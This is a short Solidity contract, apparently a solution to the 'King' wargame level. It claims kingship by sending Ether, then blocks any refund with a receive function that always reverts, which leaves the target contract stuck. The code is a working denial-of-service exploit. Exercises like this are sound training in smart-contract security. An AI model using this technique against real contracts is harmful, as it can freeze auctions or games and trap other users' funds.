// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./King.sol";

contract KingHack {
    constructor() {}

    function send(address payable _king) public payable {
        (bool sent, ) = _king.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        require(false, "I don't receive money from honey");
    }
}
